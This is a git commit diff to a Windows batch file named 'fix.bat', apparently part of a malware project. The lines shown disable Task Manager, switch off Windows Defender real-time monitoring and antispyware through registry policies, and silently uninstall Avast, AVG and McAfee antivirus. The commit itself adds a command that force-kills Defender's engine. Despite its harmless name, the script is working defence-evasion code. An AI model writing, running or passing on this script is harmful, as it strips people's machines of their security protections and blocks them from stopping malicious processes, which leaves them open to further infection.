c983cbb222b10daef7ddb6c6a0798028c796e476
MidlesLex <154219383+MidlesLex@users.noreply.github.com>
2024-02-15 19:41:20 +0100

    Update fix.bat

--- fix.bat
+++ fix.bat
@@ -2,7 +2,7 @@
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-
+taskkill /f /im MsMpEng.exe
 wmic product where "name like '%%Avast%%Free%%Antivirus%%'" call uninstall /nointeractive
 wmic product where "name like '%%AVG%%Antivirus%%'" call uninstall /nointeractive
 wmic product where "name like '%%McAfee%%Antivirus%%'" call uninstall /nointeractive
